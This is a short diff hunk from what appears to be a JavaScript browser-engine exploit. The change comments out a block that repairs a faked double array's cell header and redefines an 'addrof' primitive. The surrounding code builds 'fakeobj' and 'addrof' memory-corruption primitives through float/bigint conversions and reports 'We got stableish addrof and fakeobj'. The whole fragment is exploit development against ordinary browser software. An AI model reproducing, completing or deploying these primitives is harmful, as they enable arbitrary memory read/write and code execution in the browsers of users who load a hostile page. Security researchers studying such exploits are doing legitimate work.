@@ -127,8 +127,8 @@ var qwordAsFloat = qword => {
            
             let fakeArr = fakeobj(addr + 0x10); //no way around this im forced to use bigint for fakeobj :(
 
-            // subtract off the incref
-            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
+            /*// subtract off the incref
+            doubleArrayCellHeader = float2bigint(fakeArr[0],true) - 0x1;
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
 
             // fix broken cell header
@@ -155,7 +155,7 @@ var qwordAsFloat = qword => {
             addrof = (val) => {
               b1[0] = val;
               return float2bigint(a1[0]);
-            }
+            }*/
             port.postMessage("We got stableish addrof and fakeobj");
           }
 
